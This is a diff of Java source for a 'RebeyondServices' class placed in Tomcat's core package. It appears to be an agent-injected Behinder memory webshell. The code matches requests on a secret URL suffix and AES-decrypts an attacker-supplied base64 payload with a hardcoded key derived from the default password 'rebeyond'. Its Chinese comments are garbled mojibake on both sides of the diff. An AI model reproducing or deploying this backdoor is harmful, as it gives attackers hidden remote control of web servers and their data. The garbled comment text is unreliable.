@@ -8,19 +8,19 @@ import java.lang.reflect.InvocationTargetException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 
-//ÕâÀï£¬ÎÒÒ²ÏëÊ¹ÓÃÔ­Ê¼µÄ°ì·¨½øĞĞ¼ÓÔØ£¬µ«agent×¢ÈëÊÇ²»ÔÊĞí²úÉúĞÂÀàºÍĞÂº¯ÊıµÄ¡£
-//ËùÒÔ»¹ÊÇ±»ÆÈÔÚ¶à¸ö»·¾³ÖĞ½øĞĞÀà¼ÓÔØ
+//è¿™é‡Œï¼Œæˆ‘ä¹Ÿæƒ³ä½¿ç”¨åŸå§‹çš„åŠæ³•è¿›è¡ŒåŠ è½½ï¼Œä½†agentæ³¨å…¥æ˜¯ä¸å…è®¸äº§ç”Ÿæ–°ç±»å’Œæ–°å‡½æ•°çš„ã€‚
+//æ‰€ä»¥è¿˜æ˜¯è¢«è¿«åœ¨å¤šä¸ªç¯å¢ƒä¸­è¿›è¡Œç±»åŠ è½½
 public class RebeyondServices {
     public static String SERVICE_URL="agenstR";
 
-    //£¨×Ô¶¨ÒåÀàÔÚagentÖĞµ÷ÓÃ²»µ½£©£¬ÕâÀïÊ¹ÓÃ·´Éä¼ÓÔØ
-    //´«½øÀ´¾Í±ä³ÉRequestFacade ËùÒÔ±ØÒª²Ù×÷ÔÚº¯ÊıÍâ×öµô
-    //ÕâÀïÓÃµÄÊÇ4.1 ±ùĞ«
-    public static void doServices(java.util.Map rdd,Object obj) //Å×³ö±í±ÈÎÒÃü»¹³¤
+    //ï¼ˆè‡ªå®šä¹‰ç±»åœ¨agentä¸­è°ƒç”¨ä¸åˆ°ï¼‰ï¼Œè¿™é‡Œä½¿ç”¨åå°„åŠ è½½
+    //ä¼ è¿›æ¥å°±å˜æˆRequestFacade æ‰€ä»¥å¿…è¦æ“ä½œåœ¨å‡½æ•°å¤–åšæ‰
+    //è¿™é‡Œç”¨çš„æ˜¯4.1 å†°è
+    public static void doServices(java.util.Map rdd,Object obj) //æŠ›å‡ºè¡¨æ¯”æˆ‘å‘½è¿˜é•¿
             throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
         System.out.println("Rebeyond"+SERVICE_URL);
         if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.RebeyondServices.SERVICE_URL)) { //
-            String k="e45e329feb5d925b";/*¸ÃÃÜÔ¿ÎªÁ¬½ÓÃÜÂë32Î»md5ÖµµÄÇ°16Î»£¬?Ä¬ÈÏÁ¬½ÓÃÜÂërebeyond*/ //
+            String k="e45e329feb5d925b";/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œ?é»˜è®¤è¿æ¥å¯†ç rebeyond*/ //
             javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES"); //
             c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES")); //
             byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b")); //
